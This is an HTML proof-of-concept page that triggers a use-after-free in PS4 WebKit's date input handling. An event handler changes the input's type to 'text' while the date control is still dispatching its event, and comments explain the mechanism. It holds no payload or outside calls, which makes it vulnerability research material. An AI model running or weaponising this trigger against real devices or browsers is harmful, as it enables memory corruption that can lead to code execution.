<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - BaseDateAndTimeInputType UAF</title>
</head>

<body>

<input id="input" type="date">

<script>
(function () {

    var input = document.getElementById("input");

    /*
     * The critical operation:
     *
     * BaseDateAndTimeInputType::didChangeValueFromControl()
     * dispatches the "input" event.
     *
     * The event handler changes the input type from "date" to "text".
     *
     * This can destroy the existing BaseDateAndTimeInputType while
     * didChangeValueFromControl() is still executing.
     */

    input.addEventListener("input", function () {
        input.type = "text";
    });

    /*
     * Focus the date control so the browser's native date editor
     * becomes active.
     */
    window.addEventListener("load", function () {
        input.focus();
    });

})();
</script>

</body>
</html>
